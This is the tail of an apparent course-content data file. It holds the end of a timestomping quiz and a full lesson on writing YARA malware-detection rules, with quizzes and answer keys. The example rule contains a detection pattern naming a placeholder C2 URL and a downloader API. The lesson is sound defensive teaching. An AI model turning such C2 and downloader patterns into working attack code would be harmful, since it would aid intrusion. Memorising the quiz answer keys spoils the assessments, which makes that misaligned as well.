          "label": "Timestomping: the attacker backdated the easily-changed $STANDARD_INFORMATION times but not the harder-to-alter $FILE_NAME times, exposing the tampering.",
          "value": "b"
        },
        {
          "label": "A corrupted disk, because the only way the two NTFS timestamp structures can ever differ is physical damage to the drive storing the file.",
          "value": "c"
        },
        {
          "label": "Nothing suspicious, because $STANDARD_INFORMATION and $FILE_NAME are copies that Windows keeps perfectly identical, so any tool reading them made an error.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Most timestomping tools alter the easily-changed $STANDARD_INFORMATION timestamps but not the harder-to-modify $FILE_NAME ones, so a 2019 $STANDARD_INFORMATION time against a last-week $FILE_NAME time is a classic signature of backdating (MITRE Indicator Removal: Timestomp). Option a invents update behaviour that does not backdate files years into the past. Option c is wrong because the two structures legitimately differ by design and mismatch here signals tampering, not disk damage. Option d is false because the two are distinct structures, not kept identical."
    }
  ],
  "references": [
    "https://plaso.readthedocs.io/en/latest/",
    "https://attack.mitre.org/techniques/T1070/006/",
    "https://www.sans.org/posters/windows-forensic-analysis/"
  ],
  "xp": 210,
  "estimatedMinutes": 42,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-yara-rules",
  "slug": "yara-rules-writing-detection-signatures",
  "title": "YARA Rules: Writing Detection Signatures",
  "topic": "Malware Analysis",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "When researchers find a new piece of malware, they need a way to answer a bigger question: where else is this, or anything like it, hiding? YARA is the tool that answers it. Often called the pattern-matching swiss army knife for malware researchers, YARA lets you describe what a malware family looks like — the strings and byte patterns inside it — as a rule, then scan thousands of files, processes, or memory images for anything matching. This lesson explains what YARA is, how a rule is structured, how to write one that catches variants without drowning in false positives, and how a SOC uses YARA to hunt across the whole environment.",
  "sections": [
    {
      "heading": "What YARA Is and Why It Exists",
      "content": "**YARA** is a tool for **identifying and classifying files (or memory, or processes) by matching them against patterns you define in rules.** Its own tagline calls it \"the pattern-matching swiss army knife for malware researchers,\" and that captures the idea: you describe the characteristics of a piece of malware — distinctive text strings, unique byte sequences — and YARA scans a target to see whether those characteristics are present.\n\nThe problem YARA solves is one every analyst hits. You investigate one infection and identify the malware. But is it on other machines? Are there variants of it in your file storage? Did it appear in a memory image? Checking each file by hand is impossible. YARA lets you **encode what the malware looks like once, then scan everywhere for it automatically.**\n\nContrast this with a plain **file hash**. A hash (like SHA-256) identifies *one exact file* — change a single byte and the hash is completely different, so hash-matching misses even trivially modified variants. YARA is more flexible: because a rule matches on *content patterns* rather than an exact whole-file fingerprint, one good rule can catch a whole *family* of related samples, including new variants the attacker tweaked to change the hash. That generalisation is YARA's core strength.\n\nYARA is used throughout the security industry:\n\n- **Malware research and classification** — grouping samples into families.\n- **Threat intelligence** — vendors and CERTs publish YARA rules so others can detect a threat.\n- **Incident response and hunting** — scanning an environment for known-bad patterns.\n- **Inside security products** — EDRs, sandboxes, and scanners run YARA rules under the hood.\n\nBecause rules are just text, they are **shareable**: when a threat-intel report describes a new campaign, it often includes YARA rules you can run immediately against your own estate. For a Tier-2 analyst, YARA is both a way to *consume* others' detections and to *create* your own from what you find. The rest of this lesson shows how a rule is built and how to write one well."
    },
    {
      "heading": "The Anatomy of a YARA Rule",
      "content": "A YARA rule is a small block of text with a fixed, readable structure. Once you can read the three parts, you can understand almost any rule you encounter. Here is a simple example:\n\n```\nrule Suspicious_Downloader\n{\n    meta:\n        author = \"analyst\"\n        description = \"Detects sample downloader strings\"\n        date = \"2026-08-15\"\n\n    strings:\n        $a = \"http://evil-c2.example/gate.php\"\n        $b = \"InternetOpenUrlA\"\n        $c = { 6A 40 68 00 30 00 00 }   // a hex byte pattern\n\n    condition:\n        $a or ($b and $c)\n}\n```\n\nThe rule has three sections:\n\n- **`meta`** — documentation about the rule: author, description, date, references, threat name. It does not affect matching; it exists so humans (and tooling) understand what the rule is for. Good `meta` is a mark of a professional rule.\n- **`strings`** — the patterns to look for, each given a name starting with `$`. YARA supports three kinds:\n  - **Text strings** — literal text, like a URL or a distinctive message (`$a` above).\n  - **Hexadecimal strings** — raw byte sequences, useful for matching code or binary structures (`$c` above), and they can include wildcards.\n  - **Regular expressions** — for flexible pattern matching when a fixed string is too rigid.\n  Text strings can carry modifiers such as `nocase` (case-insensitive), `wide` (for Unicode/UTF-16 text, common in Windows), and `ascii`.\n- **`condition`** — the logic that decides a match, referencing the named strings. This is the brain of the rule. It can be simple (`$a`) or combine strings with Boolean logic (`$a or ($b and $c)`), counts (`2 of ($a, $b, $c)`, or `all of them`, `any of them`), file-size checks (`filesize < 200KB`), and location tests.\n\nReading the example: the rule matches if the C2 URL string is present, **or** if both the API name and the byte pattern appear together. That \"or\" plus the grouped \"and\" is typical — it lets one rule catch a sample by its most obvious marker while still catching stealthier variants by a combination of weaker signals.\n\nThe `condition` is where rule-writing skill lives, because it controls the trade-off at the heart of every signature: match too loosely and you get false positives; match too tightly and you miss variants. The next section is about getting that balance right."
    },
    {
      "heading": "Writing Rules That Work — Specific but Not Brittle",
      "content": "Anyone can write a YARA rule; writing a *good* one is a craft, and it comes down to a single tension: a rule must be **specific enough to avoid false positives** yet **general enough to catch variants.** Lean too far either way and the rule fails in practice.\n\n**The two failure modes:**\n\n- **Too broad (false positives).** A rule keyed on a common string — say, a Windows API name like `CreateProcessA` that appears in thousands of legitimate programs — will match everywhere. In a SOC, a noisy rule is worse than no rule, because it buries analysts in false alarms and trains them to ignore it.\n- **Too narrow (brittle, misses variants).** A rule that depends on one hyper-specific detail — the exact C2 URL, or a string the attacker can trivially change — breaks the moment the attacker tweaks that detail. It then catches only the one sample you already had, adding little over a hash.\n\n**Principles for good rules:**\n\n- **Anchor on what is hard for the attacker to change.** Distinctive internal strings, unusual constant values, or code byte-patterns that are structural to the malware are more durable than an easily-swapped URL or filename. Prefer patterns tied to the malware's *function*, not its cosmetics.\n- **Combine multiple weaker indicators.** Rather than one string, require a *combination* (`2 of them`, or `$a and $b`). Each individual string might appear in benign files, but the combination is rare — this raises specificity without becoming brittle.\n- **Use `filesize` and context to constrain.** Bounding the file size or file type cuts false positives cheaply.\n- **Document in `meta` and test both ways.** State what the rule targets, then test it against **known malicious** samples (does it catch them?) *and* a corpus of **known-good** files (does it stay quiet?). A rule you have not tested against clean files is a false-positive incident waiting to happen.\n- **Avoid over-fitting to one sample.** If every string in your rule comes from a single file, you have essentially written a fancy hash. Aim to capture the *family*.\n\nThe mental model is a dial between precision and coverage. You tune the `condition` — how many indicators must match, how they combine, what size window — until the rule reliably fires on the malware family and stays silent on everything else. That tuning, validated against real good and bad samples, is exactly the detection-engineering judgement that separates a rule that helps a SOC from one that floods it."
    },
    {
      "heading": "Using YARA in the SOC",
      "content": "With rules understood, the payoff is what YARA lets a SOC *do*: turn knowledge about a threat into action across the entire environment. A few workflows recur.\n\n**Hunting across the estate.** When you learn about a threat — from your own investigation or a threat-intel report — you can scan broadly for it. YARA runs against **files** (a directory, a drive, uploaded samples), and, importantly, against **running processes and memory images**, which lets it catch the fileless and injected malware that memory forensics surfaces. Point a rule at every endpoint's suspicious directories, or at a memory dump, and YARA answers \"is this threat here?\" at scale.\n\n**Consuming shared intelligence.** Threat-intel reports, CERT advisories, and vendors routinely publish YARA rules for new campaigns. Because rules are portable text, you can take a rule from a report about a fresh malware family and immediately scan your environment for it — one of the fastest ways to check exposure to a newly-disclosed threat. This is YARA as a *consumption* format for detection.\n\n**Feeding products and pipelines.** YARA is built into many tools — sandboxes classify detonated samples with it, EDRs and scanners run rule sets, and automated pipelines tag files. A rule you write can be deployed into these to provide ongoing, automated detection, not just a one-time scan.\n\n**Retrohunting.** Some platforms let you run a new rule against a *historical* archive of samples — \"retrohunting\" — to discover whether a newly-understood threat was present in the past, before you had a rule for it. This turns a fresh rule into a look backward in time.\n\n**Where YARA fits among your tools.** YARA is a **content-pattern** detector — it excels at recognising known-bad *patterns* in files and memory. It complements, rather than replaces, the other techniques in this track: **network** analysis (Wireshark) sees traffic, **memory** forensics (Volatility) reconstructs live state, **timeline** analysis orders events, and **YARA** answers \"does this content match a known threat?\" A common combined move: memory forensics finds injected code, you extract its distinctive strings, write a YARA rule from them, and scan every other endpoint's memory to find every machine carrying the same implant.\n\nThe takeaway for a Tier-2 analyst is that YARA converts a single discovery into **scalable detection**. Learn what one threat looks like, express it as a rule, and you can ask — across thousands of files, processes, and memory images, and even backward through history — \"where else is this?\" That leverage, from one sample to environment-wide hunting, is why YARA is a staple of modern detection and response."
    }
  ],
  "keyTakeaways": [
    "YARA identifies and classifies files, processes, and memory by matching content patterns you define in rules; unlike a file hash (which matches one exact file), one good rule can catch a whole malware family including tweaked variants — and rules are shareable text.",
    "A rule has three parts: meta (documentation — author/description/threat, no effect on matching), strings (named $patterns: text, hex byte sequences with wildcards, or regex, with modifiers like nocase/wide), and condition (the Boolean logic — $a or ($b and $c), '2 of them', filesize checks).",
    "Good rules balance specific-enough-to-avoid-false-positives against general-enough-to-catch-variants: anchor on hard-to-change internal strings/byte patterns, combine multiple weaker indicators, constrain with filesize, document in meta, and test against BOTH known-bad and known-good samples.",
    "In the SOC, YARA scales one discovery into environment-wide detection: hunt across files and memory/processes, consume rules from threat-intel reports, feed sandboxes/EDR pipelines, and retrohunt history — complementing Wireshark (traffic), Volatility (memory), and timeline analysis (sequence)."
  ],
  "quiz": [
    {
      "question": "Why can a single well-written YARA rule detect many variants of a malware family, whereas a SHA-256 file hash cannot?",
      "options": [
        {
          "label": "A YARA rule matches on content patterns (strings and byte sequences), so it still fires on variants, while a hash identifies one exact file and changes completely if a single byte differs.",
          "value": "a"
        },
        {
          "label": "A YARA rule and a file hash work identically, but YARA rules are simply computed faster, which is the only practical advantage YARA offers over hashing.",
          "value": "b"
        },
        {
          "label": "A SHA-256 hash matches any file in the same malware family automatically, so YARA is only needed when the malware has no hash value at all.",
          "value": "c"
        },
        {
          "label": "A YARA rule works by storing the full original malware sample inside the rule, so it can only ever match that one identical file and nothing else.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "A YARA rule matches on content patterns — distinctive strings and byte sequences — so it can catch related variants that share those patterns, whereas a SHA-256 hash fingerprints one exact file and changes entirely if even a single byte is altered, missing trivially modified variants. Option b is wrong because they do not work identically; the difference is pattern-matching vs exact-file matching. Option c is false because a hash matches only one exact file, not a family. Option d misdescribes YARA, which stores patterns, not the whole sample."
    },
    {
      "question": "An analyst writes a YARA rule whose only string is the Windows API name \"CreateProcessA\", which appears in thousands of legitimate programs. What is the likely problem, and what is the better approach?",
      "options": [
        {
          "label": "The rule is too narrow and will miss variants; the fix is to remove the condition section entirely so the rule matches every file it scans.",
          "value": "a"
        },
        {
          "label": "The rule is too broad and will cause many false positives; combine multiple distinctive indicators and anchor on patterns hard for the attacker to change.",
          "value": "b"
        },
        {
          "label": "The rule is perfectly tuned, because matching a common API name guarantees it will detect the malware family without ever flagging any benign software.",
          "value": "c"
        },
        {
          "label": "The problem is only performance; the rule is accurate but slow, so the fix is simply to run it on fewer files rather than changing its logic at all.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Keying a rule on a common API name that appears in thousands of legitimate programs makes it too broad, producing many false positives that bury analysts; the better approach is to combine multiple distinctive indicators and anchor on patterns the attacker cannot easily change, tuning specificity without becoming brittle. Option a misdiagnoses it as too narrow and suggests removing the condition, which would match everything. Option c is wrong because a common string flags benign software. Option d misframes a false-positive (accuracy) problem as merely performance."
    }
  ],
  "references": [
    "https://yara.readthedocs.io/en/stable/writingrules.html",
    "https://github.com/VirusTotal/yara",
    "https://attack.mitre.org/techniques/T1059/"
  ],
  "xp": 210,
  "estimatedMinutes": 42,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
}
];

export default NEW_TOPIC_LESSONS;
export { NEW_TOPIC_LESSONS };
